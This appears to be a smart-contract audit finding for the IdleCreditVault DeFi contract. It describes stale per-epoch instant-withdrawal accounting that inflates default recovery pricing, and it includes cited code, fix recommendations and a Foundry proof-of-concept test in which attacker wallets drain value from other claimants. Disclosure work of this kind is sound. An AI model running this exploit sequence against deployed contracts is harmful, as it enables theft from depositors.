### Title
Claimed instant withdrawals remain in epoch recovery accounting and inflate default recovery claims - (File: `contracts/strategies/idle/IdleCreditVault.sol`)

### Summary
`claimInstantWithdrawRequest` burns and pays the user's aggregate instant-withdrawal receipt, but never removes the already-paid amount from `instantWithdrawsRequestsByEpoch` or `instantWithdrawClaimsByEpoch`. [1](#0-0)  A later same-epoch instant request causes the stale paid receipt to be counted as prefunded default recovery collateral, inflating `defaultRecoveryReserve` and `defaultRecoveryPrice` without adding underlying. [2](#0-1) [3](#0-2) 

### Finding Description
`requestInstantWithdraw` records each request in the aggregate ledger, the per-user epoch ledger, and the global per-epoch ledger. [4](#0-3)  The normal claim path clears only `instantWithdrawsRequests[_user]`; it does not clear either per-epoch ledger. [5](#0-4)  Consequently, an attacker can request and fully claim an instant withdrawal, leave its epoch accounting behind, and have another wallet create a new pending instant request in the same `epochNumber`. [4](#0-3) 

If the borrower then defaults while the second request is pending, `defaultPendingClaimBasis` includes `instantWithdrawClaimsByEpoch[epochNumber]`, which still contains both the paid first receipt and the unpaid second receipt. [2](#0-1)  `_defaultPrefundedInstantReserve` interprets `instantBasis - pendingInstantWithdraws` as underlying already held by the strategy, even though the first receipt's funds were already transferred to the attacker. [6](#0-5)  `finalizeDefaultRecovery` then adds that phantom amount to `defaultRecoveryReserve` and calculates an inflated `defaultRecoveryPrice`. [3](#0-2)  The holder of the genuine pending receipt can claim early at the inflated price, while later default-recovery claimants encounter an undercollateralized reserve. [7](#0-6) 

### Impact Explanation
This is direct theft of default recovery followed by freezing of remaining recovery claims. Let `A` be the already-claimed stale instant receipt, `B` the attacker's second pending instant receipt, `D` the other active/default claim basis, and `R` the real recovered underlying. Correct recovery pricing should be approximately `R / (D + B)`, but stale accounting produces `(R + A) / (D + A + B)`, materially increasing the payment on `B` while `A` has no backing. [3](#0-2) [8](#0-7)  For example, with `R = 100`, `A = 900`, `B = 100`, and `D = 100`, the attacker's valid `100` claim is priced near `90.9` instead of the fair `50`, leaving the remaining claimants to absorb the missing phantom backing. [3](#0-2) [9](#0-8) 

### Likelihood Explanation
The attacker needs two unprivileged wallets, an APR decrease sufficient to enable instant withdrawals, and a genuine pending instant request in the same strategy epoch; no privileged role is malicious. [10](#0-9) [11](#0-10)  Honest manager calls can fund the first withdrawal and later trigger borrower default when the second withdrawal cannot be collected. [12](#0-11)  Existing guards do not prevent the sequence because requesting, claiming funded instant withdrawals, and default finalization are all intended flows; the missing cleanup occurs only after the successful claim. [1](#0-0) [13](#0-12) 

### Recommendation
Track the epochs comprising each user's aggregate instant receipt and clear both `instantWithdrawsRequestsByEpoch[user][epoch]` and `instantWithdrawClaimsByEpoch[epoch]` when that receipt is funded or successfully claimed. [4](#0-3) [1](#0-0)  Alternatively, subtract funded instant requests from the current-epoch claim basis in `collectInstantWithdrawFunds` and maintain a separate funded-receipt ledger so `_defaultPrefundedInstantReserve` can only count underlying that remains held by the strategy. [14](#0-13) [8](#0-7)  Add an invariant asserting that `instantWithdrawClaimsByEpoch[epoch]` contains only unclaimed or still-pending receipt basis. [15](#0-14) 

### Proof of Concept
The following test can be added to `test/foundry/IdleCreditVault.t.sol`; it uses the file's existing epoch helpers and demonstrates that an already-paid receipt creates recovery reserve with no corresponding strategy balance. [16](#0-15) [17](#0-16) 

```solidity
// test/foundry/IdleCreditVault.t.sol
function testClaimedInstantReceiptPoisonsSameEpochDefaultRecovery() external {
    _setFeeParams(TL_MULTISIG, 0, FULL_ALLOC, cdoEpoch.managementFee());

    address attackerA = makeAddr('attackerA');
    address attackerB = makeAddr('attackerB');
    IdleCreditVault vault = IdleCreditVault(address(strategy));

    // Give both attacker wallets instant-withdrawable AA tranches.
    _depositWithUser(attackerA, 10_000 * ONE_SCALE, true);
    _depositWithUser(attackerB, 100 * ONE_SCALE, true);

    // Run epoch 0, then lower the next APR enough to select instant withdrawals.
    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(
        0,
        initialProvidedApr - (cdoEpoch.instantWithdrawAprDelta() + 1),
        _expectedFundsEndEpoch()
    );

    uint256 epoch = vault.epochNumber();

    uint256 firstRequest;
    vm.prank(attackerA);
    firstRequest = cdoEpoch.requestWithdraw(0, address(AAtranche));

    // Start epoch 1, fund the instant queue, and fully claim attackerA.
    _startEpochAndCheckPrices(1);
    vm.warp(block.timestamp + cdoEpoch.instantWithdrawDelay() + 1);
    _getInstantFunds();

    vm.prank(attackerA);
    cdoEpoch.claimInstantWithdrawRequest();

    // The paid receipt remains in both per-epoch ledgers.
    assertEq(vault.instantWithdrawsRequests(attackerA), 0);
    assertEq(
        vault.instantWithdrawsRequestsByEpoch(attackerA, epoch),
        firstRequest
    );
    assertEq(vault.instantWithdrawClaimsByEpoch(epoch), firstRequest);

    // attackerB opens a real pending instant request in the same strategy epoch.
    uint256 secondRequest;
    vm.prank(attackerB);
    secondRequest = cdoEpoch.requestWithdraw(0, address(AAtranche));

    // The borrower is intentionally not funded, so the honest manager's collection
    // call enters the normal borrower-default path.
    vm.prank(manager);
    cdoEpoch.getInstantWithdrawFunds();
    assertTrue(cdoEpoch.defaulted());

    uint256 recovered = 100 * ONE_SCALE;
    deal(defaultUnderlying, borrower, recovered);
    vm.prank(borrower);
    underlying.approve(address(vault), recovered);

    uint256 strategyBalanceBefore = underlying.balanceOf(address(vault));
    vm.prank(address(cdoEpoch));
    vault.finalizeDefaultRecovery(recovered, borrower);

    // A is counted as prefunded reserve even though attackerA already withdrew it.
    assertGt(vault.defaultRecoveryReserve(), underlying.balanceOf(address(vault)));
    assertEq(
        vault.defaultRecoveryReserve() - underlying.balanceOf(address(vault)),
        firstRequest + strategyBalanceBefore
    );

    // attackerB's genuine request is paid using the inflated recovery price.
    uint256 beforeClaim = underlying.balanceOf(attackerB);
    vm.prank(attackerB);
    cdoEpoch.claimInstantWithdrawRequest();
    uint256 paid = underlying.balanceOf(attackerB) - beforeClaim;

    assertEq(paid, secondRequest * vault.defaultRecoveryPrice() / 1e18);
    assertGt(paid, 0);
}
```

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L106-109)
```text
  /// @notice instant withdraw receipt basis by user and request epoch
  mapping(address => mapping(uint256 => uint256)) public instantWithdrawsRequestsByEpoch;
  /// @notice total outstanding instant-withdraw receipt basis per request epoch
  mapping(uint256 => uint256) public instantWithdrawClaimsByEpoch;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L365-374)
```text
    // increase the instant withdraw requests for the user
    instantWithdrawsRequests[_user] += _amount;
    uint256 currentEpoch = epochNumber;
    // we record both per-user (old, kept for compatibility) and per-epoch so on
    // finalization we can distinguish "default-epoch pending instant receipts"
    // from old funded instant receipts.
    instantWithdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    instantWithdrawClaimsByEpoch[currentEpoch] += _amount;
    // increase the total instant withdraw requests
    pendingInstantWithdraws += _amount;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L380-392)
```text
  function claimInstantWithdrawRequest(address _user) external {
    _onlyIdleCDO();
    if (defaultRecoveryFinalized && defaultInstantWithdrawsFinalized) {
      // Clear the defaulted-epoch instant receipt first, then continue so the same call can
      // also pay any older instant receipt that was already funded before default finalization.
      _claimDefaultedInstantWithdrawRequest(_user);
    }
    uint256 amount = instantWithdrawsRequests[_user];
    // burn strategy tokens from user
    _burn(_user, amount);

    instantWithdrawsRequests[_user] = 0;
    _transferFundedClaim(_user, amount);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L398-403)
```text
  function collectInstantWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    if (_amount == 0) return;
    pendingInstantWithdraws -= _amount;
    underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L644-648)
```text
  function defaultPendingClaimBasis() public view returns (uint256 basis) {
    basis = pendingWithdraws;
    if (pendingInstantWithdraws != 0) {
      basis += instantWithdrawClaimsByEpoch[epochNumber];
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L661-696)
```text
  function finalizeDefaultRecovery(uint256 _recoveredAmount, address _recoverySource) external returns (uint256 defaultBBNav) {
    _onlyIdleCDO();
    _ensureDefaultRecoveryInitialized();

    IIdleCDOEpochVariant cdo = IIdleCDOEpochVariant(idleCDO);
    if (defaultRecoveryFinalized || !cdo.defaulted()) revert NotAllowed();
    if (_recoveredAmount != 0 && _recoverySource == address(0)) revert NotAllowed();

    // Active holders are still represented by strategy tokens owned by the CDO. Add the
    // default-epoch net interest so they use the same claim basis as pending redeemers.
    // Split gross backing by saved NAV and default interest by the configured APR split.
    // The CDO strategy-token balance is its gross active value before `unclaimedFees`.
    // Using it directly restores those waived unpaid fees to active recovery basis.
    uint256 activeBalance = balanceOf(idleCDO);
    uint256 activeInterest = _defaultActiveInterestBasis(cdo);
    uint256 activeBasis = activeBalance + activeInterest;
    defaultBBNav = _defaultBBBasis(cdo, activeBalance, activeInterest);
    // Pending receipts have already left active CDO NAV, so they are added as a separate basis.
    uint256 pendingBasis = defaultPendingClaimBasis();
    uint256 totalBasis = activeBasis + pendingBasis;
    if (totalBasis == 0) revert NotAllowed();

    // Some recovery funds may already be in this strategy: partially prefunded instant requests
    // and borrower-send funds that failed at epoch start. Count both without pulling them again.
    uint256 prefundedReserve = _defaultPrefundedInstantReserve();
    uint256 reserveAmount = _recoveredAmount + prefundedReserve + defaultRecoveryReserve;
    // Recovery can be above par if the recovered funds exceed the computed basis.
    uint256 recoveryPrice = reserveAmount * RECOVERY_FULL / totalBasis;

    defaultRecoveryFinalized = true;
    defaultRecoveryReserve = reserveAmount;
    defaultRecoveryPrice = recoveryPrice;
    defaultRecoveryEpoch = epochNumber;
    // A non-zero pending instant bucket means current-epoch instant receipts were not fully funded
    // and must be paid through the same recovery ratio as normal pending receipts.
    defaultInstantWithdrawsFinalized = pendingInstantWithdraws != 0;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L712-722)
```text
  /// @notice Get current-epoch instant-withdraw funds already collected before default finalization.
  /// @dev `pendingInstantWithdraws` is the still-unfunded remainder. If it is lower than the
  /// current-epoch claim basis, the difference is already-held underlying reserved for those claims.
  /// @return prefundedReserve amount of current instant claims already backed by strategy underlyings
  function _defaultPrefundedInstantReserve() internal view returns (uint256 prefundedReserve) {
    uint256 pendingInstant = pendingInstantWithdraws;
    if (pendingInstant == 0) return prefundedReserve;
    uint256 instantBasis = instantWithdrawClaimsByEpoch[epochNumber];
    if (instantBasis > pendingInstant) {
      prefundedReserve = instantBasis - pendingInstant;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L842-855)
```text
  function _claimDefaultedInstantWithdrawRequest(address _user) internal returns (uint256 claimBasis) {
    uint256 defaultEpoch = defaultRecoveryEpoch;
    claimBasis = instantWithdrawsRequestsByEpoch[_user][defaultEpoch];
    if (claimBasis == 0) return claimBasis;

    instantWithdrawsRequestsByEpoch[_user][defaultEpoch] = 0;
    instantWithdrawsRequests[_user] -= claimBasis;
    uint256 pending = pendingInstantWithdraws;
    // `pendingInstantWithdraws` is only the unfunded remainder. If this user's claim is larger,
    // the extra amount was already counted as prefunded reserve during default finalization.
    pendingInstantWithdraws = claimBasis >= pending ? 0 : pending - claimBasis;
    instantWithdrawClaimsByEpoch[defaultEpoch] -= claimBasis;
    _burn(_user, claimBasis);
    _transferDefaultRecovery(_user, (claimBasis * defaultRecoveryPrice) / RECOVERY_FULL);
```

**File:** contracts/IdleCDOEpochVariant.sol (L558-573)
```text
  function getInstantWithdrawFunds() external {
    _checkOnlyOwnerOrManager();
    // Check that programmable mode is disabled, the epoch is running and the deadline passed.
    _checkNotAllowed(isProgrammableBorrower || !isEpochRunning || block.timestamp < instantWithdrawDeadline);

    IdleCreditVault _strategy = IdleCreditVault(strategy);
    uint256 _instantWithdraws = _pendingInstant();
    // transfer funds for instant withdraw to this contract
    try this.getFundsFromBorrower(_instantWithdraws) {
      // transfer funds to IdleCreditVault and decrease pendingInstantWithdraws
      _strategy.collectInstantWithdrawFunds(_instantWithdraws);
      // allow instant withdraws
      allowInstantWithdraw = true;
    } catch {
      _handleBorrowerDefault(_instantWithdraws);
    }
```

**File:** contracts/IdleCDOEpochVariant.sol (L739-744)
```text
  function requestWithdraw(uint256 _amount, address _tranche) external returns (uint256 _underlyings) {
    _checkTranche(_tranche);
    _checkNotAllowed(
      (_tranche == AATranche ? !allowAAWithdrawRequest : !allowBBWithdrawRequest) ||
      !isWalletAllowed(msg.sender)
    );
```

**File:** contracts/IdleCDOEpochVariant.sol (L761-768)
```text
    if (_isInstantWithdrawEnabled()) {
      uint256 currentApr = creditVault.unscaledApr();
      if (lastEpochApr > (currentApr + instantWithdrawAprDelta)) {
        // burn strategy tokens from cdo and mint an equal amount to msg.sender as receipt
        creditVault.requestInstantWithdraw(_underlyings, msg.sender);
        // burn tranche tokens and decrease NAV
        _withdrawOps(_amount, _underlyings, _tranche);
        return _underlyings;
```

**File:** test/foundry/IdleCreditVault.t.sol (L4742-4785)
```text
  function testClaimInstantWithdrawRequest() external {
    _setFeeParams(TL_MULTISIG, 10000, FULL_ALLOC, cdoEpoch.managementFee()); // 10%

    uint256 amount = 10000;
    uint256 amountWei = amount * ONE_SCALE;

    // AARatio 50%
    uint256 mintedAA = idleCDO.depositAA(amountWei);
    uint256 mintedBB = idleCDO.depositBB(amountWei);
    
    // run epoch 0
    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, initialProvidedApr / 2, _expectedFundsEndEpoch());

    IdleCreditVault _strategy = IdleCreditVault(address(strategy));
    // request instant withdraw (5000)
    uint256 requestedAA1 = cdoEpoch.requestWithdraw(mintedAA / 2, address(AAtranche));

    // do some intermediate deposits to check that everything works even when there are new deposits
    // deposit 15000 with this contract
    mintedAA = idleCDO.depositAA(amountWei);
    mintedBB = idleCDO.depositBB(amountWei / 2);

    // deposit 10000 with user1
    address user1 = makeAddr('user1');
    _depositWithUser(user1, amountWei, false);

    // request another instant withdraw for the same tranche (5000)
    uint256 requestedAA2 = cdoEpoch.requestWithdraw(mintedAA / 2, address(AAtranche));
    // request instant withdraw for the other tranche (5000 + (10000 + interest))
    uint256 requestedBB = cdoEpoch.requestWithdraw(0, address(BBtranche));

    assertEq(IERC20Detailed(strategyToken).balanceOf(address(this)), requestedAA1 + requestedAA2 + requestedBB, 'strategyToken bal is wrong for user');
    // tot requested is 25000 + interest
    assertEq(_strategy.instantWithdrawsRequests(address(this)), requestedAA1 + requestedAA2 + requestedBB, 'instantWithdrawsRequests for user is wrong');

    // start epoch
    _startEpochAndCheckPrices(1);

    uint256 balPre = IERC20Detailed(defaultUnderlying).balanceOf(address(this));

    // can redeem right away because new deposits are enough to cover all instant withdraws
    cdoEpoch.claimInstantWithdrawRequest();

```

**File:** test/foundry/IdleCreditVault.t.sol (L4822-4851)
```text
  function testClaimInstantWithdrawRequestAfterAnEpoch() external {
    _setFeeParams(TL_MULTISIG, 10000, FULL_ALLOC, cdoEpoch.managementFee()); // 10%

    uint256 amount = 10000;
    uint256 amountWei = amount * ONE_SCALE;

    // AARatio 50%
    uint256 mintedAA = idleCDO.depositAA(amountWei);
    
    // run epoch 0
    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, initialProvidedApr / 2, _expectedFundsEndEpoch());

    // request instant withdraw (5000)
    uint256 requestedAA1 = cdoEpoch.requestWithdraw(mintedAA / 2, address(AAtranche));

    // run epoch 1 (same apr for the next one)
    _startEpochAndCheckPrices(1);
    vm.warp(block.timestamp + cdoEpoch.instantWithdrawDelay() + 1);
    _getInstantFunds();
    // Here we could have claimed but we did not
    _stopEpochAndCheckPrices(1, initialProvidedApr / 2, _expectedFundsEndEpoch());

    // run epoch 2
    _startEpochAndCheckPrices(2);

    // claim right away as it was an old withdraw request
    uint256 balPre = IERC20Detailed(defaultUnderlying).balanceOf(address(this));
    cdoEpoch.claimInstantWithdrawRequest();
    assertEq(IERC20Detailed(defaultUnderlying).balanceOf(address(this)) - balPre, requestedAA1, 'claimInstantWithdrawRequest is wrong');
```
